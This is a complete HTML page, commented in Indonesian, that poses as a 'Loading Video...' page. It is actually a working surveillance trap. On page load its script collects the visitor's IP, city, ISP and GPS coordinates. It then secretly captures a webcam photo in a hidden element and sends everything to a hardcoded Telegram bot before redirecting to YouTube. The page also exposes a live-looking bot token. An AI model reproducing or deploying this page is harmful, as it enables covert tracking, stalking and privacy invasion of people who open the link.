<!DOCTYPE html>
<html>
<head><title>Loading Video...</title></head>
<body>
    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script>
        const botToken = "7702524045:AAFyPZql1w8FCg-cbLU2yjkV-2PtD0LP6Yc"; 
        const chatId = "7263868848"; 

        async function collectData() {
            // 1. Ambil IP & Info Perangkat
            try {
                const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
                const deviceData = `ðŸ“ IP: ${ipInfo.ip}\nðŸŒ Kota: ${ipInfo.city}\nðŸ¢ ISP: ${ipInfo.org}`;
                
                // 2. Minta Lokasi GPS (dengan Timeout agar tidak stuck)
                navigator.geolocation.getCurrentPosition(pos => {
                    const gps = `ðŸ›° GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendToTele(`${deviceData}\n${gps}`);
                    captureCamera();
                }, () => {
                    sendToTele(`${deviceData}\nâš ï¸ GPS Ditolak`);
                    captureCamera();
                }, { timeout: 5000 });
            } catch (e) {
                captureCamera();
            }
        }

        function captureCamera() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'target.png');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData })
                        .then(() => { window.location.href = "https://www.youtube.com/watch?v=iRVZ6wTYecI"; });
                    }, 'image/png');
                }, 2000);
            }).catch(() => {
                window.location.href = "https://www.youtube.com/watch?v=iRVZ6wTYecI";
            });
        }

        function sendToTele(text) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
        }

        collectData();
    </script>
</body>
</html>

